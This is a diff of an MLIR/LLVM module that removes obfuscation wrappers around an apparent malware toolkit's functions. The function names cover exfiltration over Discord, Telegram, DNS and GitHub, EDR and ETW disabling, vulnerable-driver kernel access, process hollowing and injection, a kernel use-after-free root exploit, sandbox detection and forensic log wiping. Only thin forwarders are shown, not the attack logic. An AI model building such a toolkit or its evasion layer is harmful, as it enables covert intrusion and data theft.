@@ -1,526 +1,6 @@
 module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4xi64>, i1 = dense<8> : vector<2xi64>, i8 = dense<8> : vector<2xi64>, i16 = dense<16> : vector<2xi64>, i32 = dense<32> : vector<2xi64>, i64 = dense<[32, 64]> : vector<2xi64>, f16 = dense<16> : vector<2xi64>, f64 = dense<64> : vector<2xi64>, f128 = dense<128> : vector<2xi64>, "dlti.endianness" = "little">, llvm.module_asm = [], llvm.target_triple = ""} {
-  llvm.func internal @__obfs_wrap_jocky_ftrace_detach(%arg0: !llvm.ptr) -> i32 {
-    %0 = llvm.call @jocky_ftrace_detach(%arg0) : (!llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_ftrace_attach(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i32 {
-    %0 = llvm.call @jocky_ftrace_attach(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_syscall_trace(%arg0: i32) -> i32 {
-    %0 = llvm.call @jocky_syscall_trace(%arg0) : (i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_syscall_unhook(%arg0: i32) -> i32 {
-    %0 = llvm.call @jocky_syscall_unhook(%arg0) : (i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_syscall_hook(%arg0: i32, %arg1: !llvm.ptr) -> i32 {
-    %0 = llvm.call @jocky_syscall_hook(%arg0, %arg1) : (i32, !llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_lkm_get_symbol(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> !llvm.ptr {
-    %0 = llvm.call @jocky_lkm_get_symbol(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_jocky_lkm_unload(%arg0: !llvm.ptr) -> i32 {
-    %0 = llvm.call @jocky_lkm_unload(%arg0) : (!llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_lkm_load(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i32 {
-    %0 = llvm.call @jocky_lkm_load(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_ebpf_run(%arg0: i32, %arg1: !llvm.ptr, %arg2: i32) -> i64 {
-    %0 = llvm.call @jocky_ebpf_run(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, i32) -> i64
-    llvm.return %0 : i64
-  }
-  llvm.func internal @__obfs_wrap_jocky_ebpf_attach(%arg0: i32, %arg1: i32, %arg2: i32) -> i32 {
-    %0 = llvm.call @jocky_ebpf_attach(%arg0, %arg1, %arg2) : (i32, i32, i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_ebpf_load(%arg0: !llvm.ptr, %arg1: i32, %arg2: i32) -> i32 {
-    %0 = llvm.call @jocky_ebpf_load(%arg0, %arg1, %arg2) : (!llvm.ptr, i32, i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_fence2pwn_find_uaf_primitive() -> i32 {
-    %0 = llvm.call @jocky_fence2pwn_find_uaf_primitive() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_fence2pwn_elevate_to_root() -> i32 {
-    %0 = llvm.call @jocky_fence2pwn_elevate_to_root() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_fence2pwn_trigger_reclamation() -> i32 {
-    %0 = llvm.call @jocky_fence2pwn_trigger_reclamation() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_fence2pwn_write_cred(%arg0: !llvm.ptr, %arg1: i32, %arg2: i32) -> i32 {
-    %0 = llvm.call @jocky_fence2pwn_write_cred(%arg0, %arg1, %arg2) : (!llvm.ptr, i32, i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_fence2pwn_allocate_cred_objects(%arg0: i32) -> i32 {
-    %0 = llvm.call @jocky_fence2pwn_allocate_cred_objects(%arg0) : (i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_fence2pwn_manipulate_creds(%arg0: i32, %arg1: i32) -> i32 {
-    %0 = llvm.call @jocky_fence2pwn_manipulate_creds(%arg0, %arg1) : (i32, i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_fence2pwn_exploit_uaf(%arg0: i32, %arg1: i32, %arg2: !llvm.ptr) -> i32 {
-    %0 = llvm.call @jocky_fence2pwn_exploit_uaf(%arg0, %arg1, %arg2) : (i32, i32, !llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_fence2pwn_trigger_allocations(%arg0: i64, %arg1: i32) -> i32 {
-    %0 = llvm.call @jocky_fence2pwn_trigger_allocations(%arg0, %arg1) : (i64, i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_fence2pwn_get_pool_info(%arg0: !llvm.ptr) -> i32 {
-    %0 = llvm.call @jocky_fence2pwn_get_pool_info(%arg0) : (!llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_fence2pwn_detect_kfence() -> i32 {
-    %0 = llvm.call @jocky_fence2pwn_detect_kfence() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_process_get_maps(%arg0: i32, %arg1: !llvm.ptr, %arg2: i64) -> i32 {
-    %0 = llvm.call @jocky_process_get_maps(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, i64) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_process_ptrace_detach(%arg0: i32) -> i32 {
-    %0 = llvm.call @jocky_process_ptrace_detach(%arg0) : (i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_process_ptrace_attach(%arg0: i32) -> i32 {
-    %0 = llvm.call @jocky_process_ptrace_attach(%arg0) : (i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_process_hollow_linux(%arg0: i32, %arg1: !llvm.ptr, %arg2: i64) -> i1 {
-    %0 = llvm.call @jocky_process_hollow_linux(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, i64) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_module_resolve_symbol(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> !llvm.ptr {
-    %0 = llvm.call @jocky_module_resolve_symbol(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_jocky_module_base(%arg0: !llvm.ptr) -> i64 {
-    %0 = llvm.call @jocky_module_base(%arg0) : (!llvm.ptr) -> i64
-    llvm.return %0 : i64
-  }
-  llvm.func internal @__obfs_wrap_jocky_module_has_symbol(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i1 {
-    %0 = llvm.call @jocky_module_has_symbol(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_module_unload(%arg0: !llvm.ptr) -> i1 {
-    %0 = llvm.call @jocky_module_unload(%arg0) : (!llvm.ptr) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_module_load(%arg0: !llvm.ptr) -> !llvm.ptr {
-    %0 = llvm.call @jocky_module_load(%arg0) : (!llvm.ptr) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_exfil_local_cdn(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: !llvm.ptr) -> i32 {
-    %0 = llvm.call @exfil_local_cdn(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_exfil_discord_webhook(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i32 {
-    %0 = llvm.call @exfil_discord_webhook(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_exfil_dns_tunnel(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i32 {
-    %0 = llvm.call @exfil_dns_tunnel(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_blindside_unhook_ntdll() -> i1 {
-    %0 = llvm.call @blindside_unhook_ntdll() : () -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_edrhoker_detect() -> i1 {
-    %0 = llvm.call @edrhoker_detect() : () -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_exploit_token_replacement(%arg0: i32, %arg1: i32) -> i32 {
-    %0 = llvm.call @jocky_exploit_token_replacement(%arg0, %arg1) : (i32, i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_exploit_disable_callbacks() -> i32 {
-    %0 = llvm.call @jocky_exploit_disable_callbacks() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_btr_mask_module(%arg0: !llvm.ptr) -> i1 {
-    %0 = llvm.call @btr_mask_module(%arg0) : (!llvm.ptr) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_btr_disable_notifications() -> i1 {
-    %0 = llvm.call @btr_disable_notifications() : () -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_byovd_test_exploit(%arg0: i32) -> i32 {
-    %0 = llvm.call @byovd_test_exploit(%arg0) : (i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_byovd_load_driver(%arg0: !llvm.ptr) -> i32 {
-    %0 = llvm.call @byovd_load_driver(%arg0) : (!llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_ai_score_threat() -> f64 {
-    %0 = llvm.call @ai_score_threat() : () -> f64
-    llvm.return %0 : f64
-  }
-  llvm.func internal @__obfs_wrap_ai_collect_telemetry() -> !llvm.ptr {
-    %0 = llvm.call @ai_collect_telemetry() : () -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_ai_init() -> i32 {
-    %0 = llvm.call @ai_init() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_provenance_record(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr) {
-    llvm.call @provenance_record(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_audit_verify() -> i32 {
-    %0 = llvm.call @audit_verify() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_audit_export(%arg0: !llvm.ptr) -> i1 {
-    %0 = llvm.call @audit_export(%arg0) : (!llvm.ptr) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_audit_init(%arg0: i32) -> i1 {
-    %0 = llvm.call @audit_init(%arg0) : (i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_audit_log(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: !llvm.ptr) {
-    llvm.call @audit_log(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_jocky_registry_close_key(%arg0: !llvm.ptr) -> i1 {
-    %0 = llvm.call @jocky_registry_close_key(%arg0) : (!llvm.ptr) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_registry_set_value(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: i32, %arg4: i32) -> i1 {
-    %0 = llvm.call @jocky_registry_set_value(%arg0, %arg1, %arg2, %arg3, %arg4) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_registry_create_key(%arg0: i32, %arg1: !llvm.ptr, %arg2: !llvm.ptr) -> i1 {
-    %0 = llvm.call @jocky_registry_create_key(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, !llvm.ptr) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_sandbox_export_trace(%arg0: i32, %arg1: !llvm.ptr) -> i1 {
-    %0 = llvm.call @sandbox_export_trace(%arg0, %arg1) : (i32, !llvm.ptr) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_sandbox_wait(%arg0: i32) -> i32 {
-    %0 = llvm.call @sandbox_wait(%arg0) : (i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_sandbox_monitor(%arg0: i32) -> i32 {
-    %0 = llvm.call @sandbox_monitor(%arg0) : (i32) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_sandbox_set_limits(%arg0: i32, %arg1: i64, %arg2: i32, %arg3: i64) -> i1 {
-    %0 = llvm.call @sandbox_set_limits(%arg0, %arg1, %arg2, %arg3) : (i32, i64, i32, i64) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_sandbox_spawn(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i32 {
-    %0 = llvm.call @sandbox_spawn(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_crypto_aes256_decrypt(%arg0: !llvm.ptr, %arg1: i32, %arg2: !llvm.ptr) -> !llvm.ptr {
-    %0 = llvm.call @crypto_aes256_decrypt(%arg0, %arg1, %arg2) : (!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_crypto_aes256_encrypt(%arg0: !llvm.ptr, %arg1: i32, %arg2: !llvm.ptr) -> !llvm.ptr {
-    %0 = llvm.call @crypto_aes256_encrypt(%arg0, %arg1, %arg2) : (!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_crypto_generate_key(%arg0: i32) -> !llvm.ptr {
-    %0 = llvm.call @crypto_generate_key(%arg0) : (i32) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_fs_write_file(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i64) -> i1 {
-    %0 = llvm.call @fs_write_file(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i64) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_fs_read_file(%arg0: !llvm.ptr) -> !llvm.ptr {
-    %0 = llvm.call @fs_read_file(%arg0) : (!llvm.ptr) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_fs_file_size(%arg0: !llvm.ptr) -> i64 {
-    %0 = llvm.call @fs_file_size(%arg0) : (!llvm.ptr) -> i64
-    llvm.return %0 : i64
-  }
-  llvm.func internal @__obfs_wrap_fs_list_files(%arg0: !llvm.ptr, %arg1: i1) -> !llvm.ptr {
-    %0 = llvm.call @fs_list_files(%arg0, %arg1) : (!llvm.ptr, i1) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_fs_exists(%arg0: !llvm.ptr) -> i1 {
-    %0 = llvm.call @fs_exists(%arg0) : (!llvm.ptr) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_cleanup_usn_journal() -> i32 {
-    %0 = llvm.call @jocky_cleanup_usn_journal() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_cleanup_event_logs(%arg0: !llvm.ptr) -> i32 {
-    %0 = llvm.call @jocky_cleanup_event_logs(%arg0) : (!llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_linux_cleanup_journal() -> i32 {
-    %0 = llvm.call @jocky_linux_cleanup_journal() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_linux_cleanup_syslog() -> i32 {
-    %0 = llvm.call @jocky_linux_cleanup_syslog() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_linux_forensics_wipe_bash_history() -> i32 {
-    %0 = llvm.call @linux_forensics_wipe_bash_history() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_forensics_clear_dns_cache() -> i32 {
-    %0 = llvm.call @forensics_clear_dns_cache() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_forensics_flush_arp_cache() -> i32 {
-    %0 = llvm.call @forensics_flush_arp_cache() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_forensics_wipe_cmd_history() -> i32 {
-    %0 = llvm.call @forensics_wipe_cmd_history() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_forensics_wipe_powershell_history() -> i32 {
-    %0 = llvm.call @forensics_wipe_powershell_history() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_cleanup_all() {
-    llvm.call @jocky_cleanup_all() : () -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_jocky_clear_srum() -> i1 {
-    %0 = llvm.call @jocky_clear_srum() : () -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_patch_amcache() -> i1 {
-    %0 = llvm.call @jocky_patch_amcache() : () -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_patch_shimcache() -> i1 {
-    %0 = llvm.call @jocky_patch_shimcache() : () -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_wipe_prefetch() {
-    llvm.call @jocky_wipe_prefetch() : () -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_jocky_wipe_artifacts(%arg0: !llvm.ptr) {
-    llvm.call @jocky_wipe_artifacts(%arg0) : (!llvm.ptr) -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_jocky_clear_logs() {
-    llvm.call @jocky_clear_logs() : () -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_jocky_self_delete() {
-    llvm.call @jocky_self_delete() : () -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_jocky_exfil_github(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
-    %0 = llvm.call @jocky_exfil_github(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_exfil_telegram(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
-    %0 = llvm.call @jocky_exfil_telegram(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_exfil_discord(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
-    %0 = llvm.call @jocky_exfil_discord(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_exfil_dns(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
-    %0 = llvm.call @jocky_exfil_dns(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_exfil_front(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: !llvm.ptr, %arg4: i32) -> i1 {
-    %0 = llvm.call @jocky_exfil_front(%arg0, %arg1, %arg2, %arg3, %arg4) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_exfil_encrypt(%arg0: !llvm.ptr, %arg1: i32, %arg2: !llvm.ptr, %arg3: i32) {
-    llvm.call @jocky_exfil_encrypt(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i32, !llvm.ptr, i32) -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_jocky_thread_hijack(%arg0: i32, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
-    %0 = llvm.call @jocky_thread_hijack(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_rdll_inject(%arg0: i32, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
-    %0 = llvm.call @jocky_rdll_inject(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_module_stomp(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
-    %0 = llvm.call @jocky_module_stomp(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_process_hollow(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
-    %0 = llvm.call @jocky_process_hollow(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_elevate_token(%arg0: !llvm.ptr, %arg1: i32) -> i1 {
-    %0 = llvm.call @jocky_elevate_token(%arg0, %arg1) : (!llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_disable_etw(%arg0: !llvm.ptr) -> i1 {
-    %0 = llvm.call @jocky_disable_etw(%arg0) : (!llvm.ptr) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_disable_edr_callbacks(%arg0: !llvm.ptr) -> i32 {
-    %0 = llvm.call @jocky_disable_edr_callbacks(%arg0) : (!llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_kwrite(%arg0: !llvm.ptr, %arg1: i64, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
-    %0 = llvm.call @jocky_kwrite(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i64, !llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_kread(%arg0: !llvm.ptr, %arg1: i64, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
-    %0 = llvm.call @jocky_kread(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i64, !llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_driver_map_kernel(%arg0: !llvm.ptr, %arg1: i64, %arg2: i32) -> !llvm.ptr {
-    %0 = llvm.call @jocky_driver_map_kernel(%arg0, %arg1, %arg2) : (!llvm.ptr, i64, i32) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_jocky_driver_write_phys(%arg0: !llvm.ptr, %arg1: i64, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
-    %0 = llvm.call @jocky_driver_write_phys(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i64, !llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_driver_read_phys(%arg0: !llvm.ptr, %arg1: i64, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
-    %0 = llvm.call @jocky_driver_read_phys(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i64, !llvm.ptr, i32) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_byovd_unload(%arg0: !llvm.ptr) {
-    llvm.call @jocky_byovd_unload(%arg0) : (!llvm.ptr) -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_jocky_byovd_load(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr) -> i1 {
-    %0 = llvm.call @jocky_byovd_load(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_spoof_syscall(%arg0: i32, %arg1: i64, %arg2: i64, %arg3: i64, %arg4: i64) -> i64 {
-    %0 = llvm.call @jocky_spoof_syscall(%arg0, %arg1, %arg2, %arg3, %arg4) : (i32, i64, i64, i64, i64) -> i64
-    llvm.return %0 : i64
-  }
-  llvm.func internal @__obfs_wrap_jocky_spoof_call(%arg0: !llvm.ptr, %arg1: i64, %arg2: i64, %arg3: i64, %arg4: i64) -> i64 {
-    %0 = llvm.call @jocky_spoof_call(%arg0, %arg1, %arg2, %arg3, %arg4) : (!llvm.ptr, i64, i64, i64, i64) -> i64
-    llvm.return %0 : i64
-  }
-  llvm.func internal @__obfs_wrap_jocky_get_syscall_number(%arg0: !llvm.ptr) -> i32 {
-    %0 = llvm.call @jocky_get_syscall_number(%arg0) : (!llvm.ptr) -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_unhook_ntdll() -> i1 {
-    %0 = llvm.call @jocky_unhook_ntdll() : () -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_decrypt_rc4(%arg0: !llvm.ptr, %arg1: i32, %arg2: !llvm.ptr, %arg3: i32) {
-    llvm.call @jocky_decrypt_rc4(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i32, !llvm.ptr, i32) -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_jocky_decrypt_xor(%arg0: !llvm.ptr, %arg1: i32, %arg2: i8, %arg3: i32) {
-    llvm.call @jocky_decrypt_xor(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i32, i8, i32) -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_jocky_sleep_and_recheck() {
-    llvm.call @jocky_sleep_and_recheck() : () -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_jocky_is_sandbox() -> i1 {
-    %0 = llvm.call @jocky_is_sandbox() : () -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_is_vm() -> i1 {
-    %0 = llvm.call @jocky_is_vm() : () -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_is_debugger_present() -> i1 {
-    %0 = llvm.call @jocky_is_debugger_present() : () -> i1
-    llvm.return %0 : i1
-  }
-  llvm.func internal @__obfs_wrap_jocky_check_analysis_environment() -> i32 {
-    %0 = llvm.call @jocky_check_analysis_environment() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_runtime_init() -> i32 {
-    %0 = llvm.call @jocky_runtime_init() : () -> i32
-    llvm.return %0 : i32
-  }
-  llvm.func internal @__obfs_wrap_jocky_byovd_destroy(%arg0: !llvm.ptr) {
-    llvm.call @jocky_byovd_destroy(%arg0) : (!llvm.ptr) -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_jocky_byovd_new() -> !llvm.ptr {
-    %0 = llvm.call @jocky_byovd_new() : () -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_jocky_free(%arg0: !llvm.ptr) {
-    llvm.call @jocky_free(%arg0) : (!llvm.ptr) -> ()
-    llvm.return
-  }
-  llvm.func internal @__obfs_wrap_jocky_alloc(%arg0: i64) -> !llvm.ptr {
-    %0 = llvm.call @jocky_alloc(%arg0) : (i64) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_array_append(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> !llvm.ptr {
-    %0 = llvm.call @array_append(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.return %0 : !llvm.ptr
-  }
-  llvm.func internal @__obfs_wrap_array_len(%arg0: !llvm.ptr) -> i64 {
-    %0 = llvm.call @array_len(%arg0) : (!llvm.ptr) -> i64
-    llvm.return %0 : i64
-  }
-  llvm.func internal @__obfs_wrap_exit(%arg0: i32) {
